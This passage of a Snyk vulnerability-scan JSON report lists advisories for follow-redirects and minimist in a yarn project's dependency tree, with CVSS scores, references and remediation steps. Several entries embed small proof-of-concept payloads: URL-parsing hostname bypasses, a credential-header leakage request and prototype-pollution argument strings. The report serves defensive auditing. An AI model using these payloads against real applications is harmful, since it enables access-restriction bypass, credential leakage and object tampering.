        "description": "## Overview\n\nAffected versions of this package are vulnerable to Improper Handling of Extra Parameters due to the improper handling of URLs by the `url.parse()` function. When `new URL()` throws an error, it can be manipulated to misinterpret the hostname. An attacker could exploit this weakness to redirect traffic to a malicious site, potentially leading to information disclosure, phishing attacks, or other security breaches.\n## PoC\n```js\r\n# Case 1 : Bypassing localhost restriction\r\nlet url = 'http://[localhost]/admin';\r\ntry{\r\n    new URL(url); // ERROR : Invalid URL\r\n}catch{\r\n    url.parse(url); // -> http://localhost/admin\r\n}\r\n\r\n# Case 2 : Bypassing domain restriction\r\nlet url = 'http://attacker.domain*.allowed.domain:a';\r\ntry{\r\n    new URL(url); // ERROR : Invalid URL\r\n}catch{\r\n    url.parse(url); // -> http://attacker.domain/*.allowed.domain:a\r\n}\r\n```\n## Remediation\nUpgrade `follow-redirects` to version 1.15.4 or higher.\n## References\n- [GitHub Issue](https://github.com/follow-redirects/follow-redirects/issues/235)\n- [GitHub PR](https://github.com/follow-redirects/follow-redirects/pull/236)\n",
        "epssDetails": {
          "percentile": "0.24347",
          "probability": "0.00079",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2023-26159"
          ],
          "CWE": [
            "CWE-235"
          ]
        },
        "packageName": "follow-redirects",
        "proprietary": true,
        "creationTime": "2024-01-01T15:17:16.885858Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2023-12-31T22:00:00Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-01-01T15:19:32.295744Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-09-18T11:35:11.342543Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "@odlux/framework@0.1.4",
          "http-server@0.11.2",
          "http-proxy@1.18.1",
          "follow-redirects@1.15.2"
        ],
        "upgradePath": [
          false,
          "http-server@0.11.2",
          "http-proxy@1.18.1",
          "follow-redirects@1.15.11"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "follow-redirects",
        "version": "1.15.2"
      },
      {
        "id": "SNYK-JS-FOLLOWREDIRECTS-6444610",
        "title": "Information Exposure",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N/E:P",
        "credit": [
          "4xpl0r3r"
        ],
        "semver": {
          "vulnerable": [
            "<1.15.6"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "1.15.6"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "follow-redirects",
        "references": [
          {
            "url": "https://github.com/follow-redirects/follow-redirects/commit/c4f847f85176991f95ab9c88af63b1294de8649b",
            "title": "GitHub Commit"
          },
          {
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2269576",
            "title": "RedHat Bugzilla Bug"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
            "cvssV3BaseScore": 6.5,
            "modificationTime": "2024-03-15T13:53:13.764710Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-15T08:02:52.752181Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 6.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-15T13:53:13.764710Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Information Exposure due to the handling of the `Proxy-Authorization` header across hosts. When using a dependent library, it only clears the authorization header during cross-domain redirects but allows the proxy-authentication header, which contains credentials, to persist. This behavior may lead to the unintended leakage of credentials if an attacker can trigger a cross-domain redirect and capture the persistent proxy-authentication header.\n## PoC\n```js\r\nconst axios = require('axios');\r\n\r\naxios.get('http://127.0.0.1:10081/',{\r\nheaders: {\r\n'AuThorization': 'Rear Test',\r\n'ProXy-AuthoriZation': 'Rear Test',\r\n'coOkie': 't=1'\r\n}\r\n}).then(function (response) {\r\nconsole.log(response);\r\n})\r\n```\n## Remediation\nUpgrade `follow-redirects` to version 1.15.6 or higher.\n## References\n- [GitHub Commit](https://github.com/follow-redirects/follow-redirects/commit/c4f847f85176991f95ab9c88af63b1294de8649b)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=2269576)\n",
        "epssDetails": {
          "percentile": "0.44236",
          "probability": "0.00216",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-28849"
          ],
          "CWE": [
            "CWE-200"
          ],
          "GHSA": [
            "GHSA-cxjh-pqwp-8mfp"
          ]
        },
        "packageName": "follow-redirects",
        "proprietary": false,
        "creationTime": "2024-03-15T07:42:59.062346Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-03-14T17:19:42Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-03-15T07:59:52.476336Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-15T13:53:13.764710Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "http-server@0.11.2",
          "http-proxy@1.18.1",
          "follow-redirects@1.15.2"
        ],
        "upgradePath": [
          false,
          "http-server@0.11.2",
          "http-proxy@1.18.1",
          "follow-redirects@1.15.11"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "follow-redirects",
        "version": "1.15.2"
      },
      {
        "id": "SNYK-JS-MINIMIST-2429795",
        "title": "Prototype Pollution",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "<0.2.4",
            ">=1.2.0 <1.2.6"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "0.2.4",
          "1.2.6"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "low",
        "cvssScore": 3.7,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "minimist",
        "references": [
          {
            "url": "https://github.com/minimistjs/minimist/commit/34e20b8461118608703d6485326abbb8e35e1703",
            "title": "Fix Commit"
          },
          {
            "url": "https://github.com/minimistjs/minimist/commit/c2b981977fa834b223b408cfb860f933c9811e4d",
            "title": "Fix Commit"
          },
          {
            "url": "https://github.com/minimistjs/minimist/blob/master/index.js%23L69",
            "title": "Vulnerable Code"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "critical",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 9.8,
            "modificationTime": "2024-03-11T09:49:30.625120Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N",
            "cvssV3BaseScore": 3.1,
            "modificationTime": "2025-08-06T23:11:43.482921Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "cvssV3BaseScore": 5.6,
            "modificationTime": "2024-03-11T09:49:28.176331Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
            "assigner": "Snyk",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:05:10.320008Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "NVD",
            "severity": "critical",
            "baseScore": 9.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:49:30.625120Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-08-06T23:11:43.482921Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 5.6,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:49:28.176331Z"
          }
        ],
        "description": "## Overview\n[minimist](https://www.npmjs.com/package/minimist) is a parse argument options module.\n\nAffected versions of this package are vulnerable to Prototype Pollution due to a missing handler to `Function.prototype`.\r\n\r\n**Notes:** \r\n\r\n- This vulnerability is a bypass to [CVE-2020-7598](https://security.snyk.io/vuln/SNYK-JS-MINIMIST-559764)\r\n\r\n- The reason for the different CVSS between CVE-2021-44906 to CVE-2020-7598, is that CVE-2020-7598 can pollute objects, while CVE-2021-44906 can pollute only function.\r\n\r\n\r\n## PoC by Snyk\r\n```js\r\nrequire('minimist')('--_.constructor.constructor.prototype.foo bar'.split(' '));\r\nconsole.log((function(){}).foo); // bar\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `minimist` to version 0.2.4, 1.2.6 or higher.\n## References\n- [Fix Commit](https://github.com/minimistjs/minimist/commit/34e20b8461118608703d6485326abbb8e35e1703)\n- [Fix Commit](https://github.com/minimistjs/minimist/commit/c2b981977fa834b223b408cfb860f933c9811e4d)\n- [Vulnerable Code](https://github.com/minimistjs/minimist/blob/master/index.js#L69)\n",
        "epssDetails": {
          "percentile": "0.78102",
          "probability": "0.01195",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2021-44906"
          ],
          "CWE": [
            "CWE-1321"
          ],
          "SNYK": [
            "SNYK-JS-MINIMIST-559764"
          ]
        },
        "packageName": "minimist",
        "proprietary": false,
        "creationTime": "2022-03-18T13:02:08.840039Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2022-03-18T12:24:05Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2022-03-21T12:09:35Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-08-06T23:11:43.482921Z",
        "socialTrendAlert": false,
        "severityWithCritical": "low",
        "from": [
          "@odlux/framework@0.1.4",
          "http-server@0.11.2",
          "optimist@0.6.1",
          "minimist@0.0.10"
        ],
        "upgradePath": [
          false,
          "http-server@0.12.2"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "minimist",
        "version": "0.0.10"
      },
      {
        "id": "SNYK-JS-MINIMIST-559764",
        "title": "Prototype Pollution",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C",
        "credit": [
          "Snyk Security Team"
        ],
        "semver": {
          "vulnerable": [
            "<0.2.1",
            ">=1.0.0 <1.2.3"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "0.2.1",
          "1.2.3"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 5.6,
        "functions": [
          {
            "version": [
              "<0.2.1",
              ">=1.0.0 <1.1.1"
            ],
            "functionId": {
              "filePath": "index.js",
              "className": null,
              "functionName": "setKey"
            }
          },
          {
            "version": [
              "<0.2.1",
              ">=1.1.1 <1.2.3"
            ],
            "functionId": {
              "filePath": "index.js",
              "className": null,
              "functionName": "module.exports.setKey"
            }
          }
        ],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "minimist",
        "references": [
          {
            "url": "https://gist.github.com/Kirill89/47feb345b09bf081317f08dd43403a8a",
            "title": "Command Injection PoC"
          },
          {
            "url": "https://github.com/substack/minimist/commit/63e7ed05aa4b1889ec2f3b196426db4500cbda94",
            "title": "GitHub Fix Commit #1"
          },
          {
            "url": "https://github.com/substack/minimist/commit/38a4d1caead72ef99e824bb420a2528eec03d9ab",
            "title": "GitHub Fix Commit #2"
          },
          {
            "url": "https://snyk.io/blog/prototype-pollution-minimist/",
            "title": "Snyk Research Blog"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "cvssV3BaseScore": 5.6,
            "modificationTime": "2024-03-11T09:51:08.982259Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "cvssV3BaseScore": 5.6,
            "modificationTime": "2024-03-11T09:53:54.306706Z"
          },
          {
            "assigner": "SUSE",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 8.1,
            "modificationTime": "2024-03-11T09:50:00.847382Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 5.6,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T13:57:20.229152Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 5.6,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:51:08.982259Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 5.6,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:54.306706Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "SUSE",
            "severity": "high",
            "baseScore": 8.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:50:00.847382Z"
          }
        ],
        "description": "## Overview\n[minimist](https://www.npmjs.com/package/minimist) is a parse argument options module.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The library could be tricked into adding or modifying properties of `Object.prototype` using a `constructor` or `__proto__` payload.\r\n\r\n## PoC by Snyk\r\n```\r\nrequire('minimist')('--__proto__.injected0 value0'.split(' '));\r\nconsole.log(({}).injected0 === 'value0'); // true\r\n\r\nrequire('minimist')('--constructor.prototype.injected1 value1'.split(' '));\r\nconsole.log(({}).injected1 === 'value1'); // true\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `minimist` to version 0.2.1, 1.2.3 or higher.\n## References\n- [Command Injection PoC](https://gist.github.com/Kirill89/47feb345b09bf081317f08dd43403a8a)\n- [GitHub Fix Commit #1](https://github.com/substack/minimist/commit/63e7ed05aa4b1889ec2f3b196426db4500cbda94)\n- [GitHub Fix Commit #2](https://github.com/substack/minimist/commit/38a4d1caead72ef99e824bb420a2528eec03d9ab)\n- [Snyk Research Blog](https://snyk.io/blog/prototype-pollution-minimist/)\n",
        "epssDetails": {
          "percentile": "0.48537",
          "probability": "0.00253",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2020-7598"
          ],
          "CWE": [
            "CWE-1321"
          ],
          "NSP": [
            "1179"
          ],
          "GHSA": [
            "GHSA-vh95-rmgr-6w4m"
          ]
        },
        "packageName": "minimist",
        "proprietary": true,
        "creationTime": "2020-03-11T08:25:47.093051Z",
        "functions_new": [
          {
            "version": [
              "<0.2.1",
              ">=1.0.0 <1.1.1"
            ],
            "functionId": {
              "filePath": "index.js",
              "functionName": "setKey"
            }
          },
          {
            "version": [
              "<0.2.1",
              ">=1.1.1 <1.2.3"
            ],
            "functionId": {
              "filePath": "index.js",
              "functionName": "module.exports.setKey"
            }
          }
        ],
        "alternativeIds": [],
        "disclosureTime": "2020-03-10T08:22:24Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2020-03-11T08:22:19Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:53:54.306706Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "http-server@0.11.2",
          "optimist@0.6.1",
          "minimist@0.0.10"
        ],
        "upgradePath": [
          false,
          "http-server@0.12.2"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "minimist",
        "version": "0.0.10"
      }
    ],
    "ok": false,
    "dependencyCount": 130,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "yarn",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "39 vulnerable dependency paths",
    "remediation": {
      "unresolved": [
        {
          "id": "SNYK-JS-FOLLOWREDIRECTS-6141137",
          "title": "Improper Handling of Extra Parameters",
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P",
          "credit": [
            "Kim Donggyu"
          ],
          "semver": {
            "vulnerable": [
              "<1.15.4"
            ]
          },
          "exploit": "Proof of Concept",
          "fixedIn": [
            "1.15.4"
          ],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "high",
          "cvssScore": 7.3,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "follow-redirects",
          "references": [
            {
              "url": "https://github.com/follow-redirects/follow-redirects/issues/235",
              "title": "GitHub Issue"
            },
            {
              "url": "https://github.com/follow-redirects/follow-redirects/pull/236",
              "title": "GitHub PR"
            }
          ],
          "cvssDetails": [
            {
              "assigner": "NVD",
              "severity": "medium",
              "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
              "cvssV3BaseScore": 6.1,
              "modificationTime": "2024-03-11T09:48:50.700729Z"
            },
            {
              "assigner": "Red Hat",
              "severity": "medium",
              "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
              "cvssV3BaseScore": 6.1,
              "modificationTime": "2024-03-11T09:49:56.424424Z"
            }
          ],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P",
              "assigner": "Snyk",
              "severity": "high",
              "baseScore": 7.3,
              "cvssVersion": "3.1",
              "modificationTime": "2024-09-18T11:35:11.342543Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
              "assigner": "NVD",
              "severity": "medium",
              "baseScore": 6.1,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-11T09:48:50.700729Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
              "assigner": "Red Hat",
              "severity": "medium",
              "baseScore": 6.1,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-11T09:49:56.424424Z"
            }
          ],
